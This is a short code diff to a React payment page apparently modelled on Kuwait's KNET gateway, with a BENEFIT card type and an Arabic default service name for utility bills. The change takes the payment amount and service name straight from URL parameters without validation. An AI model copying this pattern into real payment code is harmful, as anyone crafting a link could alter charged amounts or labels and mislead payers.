@@ -178,9 +178,11 @@ export default function KNETPayment() {
   const [errorModalMessage, setErrorModalMessage] = useState("");
   const [showAcceptedCards, setShowAcceptedCards] = useState(false);
 
-  // Get amount from localStorage
+  // Get service name from URL and amount from localStorage
+  const searchParams = new URLSearchParams(window.location.search);
+  const serviceParam = searchParams.get('service') || '';
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
-  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";
+  const totalAmount = searchParams.get('amount') || mohData.totalAmount || localStorage.getItem("Total") || "0.000";
   // Real-time date/time
   const [dateStr, setDateStr] = useState("");
   useEffect(() => {
@@ -458,7 +460,7 @@ export default function KNETPayment() {
       totalPaid: totalAmount,
       cardType: "benefit",
       cardLast4: cleanCard.slice(-4),
-      serviceName: mohData.serviceType || "دفع فاتورة الكهرباء والماء",
+      serviceName: serviceParam || mohData.serviceType || "دفع فاتورة الكهرباء والماء",
       bankName: "BENEFIT",
       bankLogo: "/benefit-logo.png",
     };
